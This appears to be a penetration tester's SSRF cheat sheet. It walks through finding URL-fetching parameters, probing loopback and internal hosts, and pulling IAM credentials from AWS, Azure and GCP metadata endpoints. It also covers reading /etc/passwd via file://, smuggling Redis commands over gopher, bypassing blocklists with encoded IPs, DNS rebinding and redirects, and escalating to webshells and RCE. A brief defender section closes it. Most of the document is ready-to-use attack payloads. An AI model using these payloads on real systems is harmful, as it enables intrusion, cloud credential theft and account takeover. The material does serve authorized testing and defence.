SSRF (Server-Side Request Forgery) - Cheat Sheet

Abuse a server feature that fetches a URL so it makes requests on YOUR behalf -
to reach internal-only services, hit cloud metadata endpoints for credentials,
scan the internal network, or read local files. The server is your proxy into
places you can't reach directly.
Replace the placeholders (<...>) with your own values.


Step 1 - Find SSRF-prone inputs

Any parameter that takes a URL, hostname, or file path:
  - ?url=  ?uri=  ?path=  ?dest=  ?redirect=  ?next=  ?feed=  ?image=  ?webhook=
  - PDF/screenshot/preview generators, webhooks, "import from URL", SSO metadata,
    XML parsers (see XXE), file uploads that fetch a remote URL.

Test by pointing it at a listener you control and watching for a hit:

    # start a catcher
    python3 -m http.server 80        # or use Burp Collaborator / interactsh
    # then set the param:
    ?url=http://<your-ip>/ssrftest


Step 2 - Confirm & map internal reach

    ?url=http://127.0.0.1/           # loopback — often reveals internal app
    ?url=http://localhost:8080/
    ?url=http://<internal-ip>/       # internal ranges: 10.x / 172.16-31.x / 192.168.x

Port-scan internally by watching response/time/length differences:

    ?url=http://127.0.0.1:22/   ?url=http://127.0.0.1:3306/   (open vs closed)


Step 3 - Cloud metadata (the high-value target)

If the app runs in a cloud VM, the metadata service holds credentials:

AWS (IMDSv1):
    ?url=http://169.254.169.254/latest/meta-data/
    ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
    ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
    # -> AccessKeyId / SecretAccessKey / Token = AWS creds

AWS IMDSv2 (needs a token header - SSRF must allow setting headers/PUT):
    PUT http://169.254.169.254/latest/api/token  (X-aws-ec2-metadata-token-ttl-seconds: 21600)
    then GET .../meta-data/... with header X-aws-ec2-metadata-token: <token>

Azure (requires Metadata:true header):
    ?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
    .../metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

GCP (requires Metadata-Flavor:Google header):
    ?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token


Step 4 - Read local files / other schemes

    ?url=file:///etc/passwd
    ?url=file:///C:/Windows/win.ini
    ?url=dict://127.0.0.1:11211/stats        # dict/gopher for protocol smuggling
    ?url=gopher://127.0.0.1:6379/_<redis-cmds>   # gopher = craft raw TCP (Redis, SMTP)


Step 5 - Filter bypasses (when blocklists block localhost/metadata)

    http://127.0.0.1        -> http://127.1  /  http://0.0.0.0  /  http://[::1]
    decimal/hex IP:            http://2130706433/   http://0x7f000001/
    169.254.169.254         -> 169.254.169.254.nip.io  /  http://425.510.510.510 (overflow)
    DNS rebinding:             a domain you control that resolves public then internal
    redirect trick:            ?url=http://<your-server>/redirect -> 302 to internal
    @ / # abuse:               http://expected.com@169.254.169.254/  ·  http://169.254.169.254#expected.com


Step 6 - Turn it into impact

  - Cloud creds from metadata   -> use with az/aws CLI (see azure-enumeration)
  - Reach internal admin panels -> auth bypass / RCE on internal apps
  - Redis/memcached via gopher  -> write webshell / keys -> RCE
  - Read secrets/config files    -> creds, tokens


Defender notes (for the report)
  - Enforce IMDSv2 (token-required) on AWS; block 169.254.169.254 egress from apps.
  - Allowlist outbound destinations; resolve + validate the final IP (not just the
    hostname) to defeat rebinding/redirects. Disable unused URL schemes.


Key idea: SSRF turns the server into a confused deputy - it has network access
and cloud identity you don't, and you borrow both by controlling the URL it
fetches. The crown jewel is almost always the cloud metadata endpoint
(169.254.169.254), which can hand you the VM's IAM credentials and pivot you
from a web bug straight into the cloud account.
